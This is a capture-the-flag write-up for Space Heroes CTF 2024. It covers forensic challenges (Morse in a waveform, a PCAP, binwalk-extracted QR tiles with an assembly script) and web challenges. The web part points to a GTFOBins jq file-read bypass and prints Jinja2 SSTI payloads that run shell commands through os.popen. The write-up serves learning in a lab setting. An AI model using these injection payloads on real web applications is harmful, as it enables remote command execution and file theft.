SNI Writeup, official site: https://serikatnewbie.me/
Official Archive: https://github.com/FITSEC/spaceheroes_ctf_24

# Forensic
1. Space Frisbee (Morse WAV)
given mp4 file, we need to find the flag from that file. the description says that there are hidden message sent by UFO's that we need to find out.
![image](https://hackmd.io/_uploads/BJ6IT5ie0.png)
lookin into the waveform, we can saw a pattern. And it being supported by the last year Space Heroes 2023 chall that has the same concept (https://github.com/FITSEC/spaceheroes_ctf_23). So i'll just decode it manually since i can't find the right tools that will do it correctly.
![image](https://hackmd.io/_uploads/ry2RpcslA.png)
`shctf{1ts_d3f1n1t3ly_n0t_4_sp0rt}`

3. A Window into Space (PCAP Analysis)
this chall is very easy. after opening the pcapng file, i try to read the packet on wireshark, and the flag is just hardcoded in the packets.
![image](https://hackmd.io/_uploads/SJTIA9seA.png)
![image](https://hackmd.io/_uploads/ry7dRqixC.png)
![image](https://hackmd.io/_uploads/BkpOAqoxA.png)
![image](https://hackmd.io/_uploads/Sk_YA9ig0.png)
![image](https://hackmd.io/_uploads/HJJcRcolC.png)
`shctf`
read it all and we got the flag
`shctf{1_sh0uld_try_h1d1ng_1n_th3_ch3cksum_n3xt_t1me_0817}`
5. Petey the Panther's (Image Binwalk)
another easy chall, given image files, i try to analyze it using exiftool and found nothing. but when i use binwalk on it i found around 400 file, that look like a QR Code, so i'll just try to append it using python script.
```
import cv2
import numpy as np

# Load all 400 split images
split_images = []
for i in range(0, 400):
    filename = f"piece_{i}.png"
    img = cv2.imread(filename)
    split_images.append(img)

# Determine the dimensions of the combined image
rows, cols, _ = split_images[0].shape
combined_rows = rows * 20
combined_cols = cols * 20

# Create a blank canvas for the combined image
combined_image = np.zeros((combined_rows, combined_cols, 3), dtype=np.uint8)

# Assemble the split images into a 20x20 grid
for i in range(20):
    for j in range(20):
        index = i * 20 + j
        combined_image[i*rows:(i+1)*rows, j*cols:(j+1)*cols] = split_images[index]

# Save the combined image as a QR code
cv2.imwrite("combined_qr_code.png", combined_image)
```
![combined_qr_code](https://hackmd.io/_uploads/H1RmkjigC.png)
i got that qr code, scan it and got the flag
`shctf{s0_l0ng_4nd_th4nks_f0r_4ll_th3_flags}`

# Web
1. GTFO's Jabba Palace (GTFObins)
a tricky challenge. given a web that says we need to find some command to bypass it (hint given: GTFObins, command starts with j). Since its a blackbox challenge, we'll just try the possibilities.
the suitable command is jq (https://gtfobins.github.io/gtfobins/jq/#file-read)
![image](https://hackmd.io/_uploads/B1BOgiieA.png)
`shctf{h4ck_m3_s010_4nd_th3_w00ki3}`
3. Antikythera (SSTI)
![image](https://hackmd.io/_uploads/By_RSssgA.png)
the web look like this, there are input form so you can try to input it something. i just test it with SSTI payload {{ 7 * 7 }} and it return the result as 49. So i'll inject with some payload and got the flag.

```
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('ls').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('cat flag.txt').read() }}
```
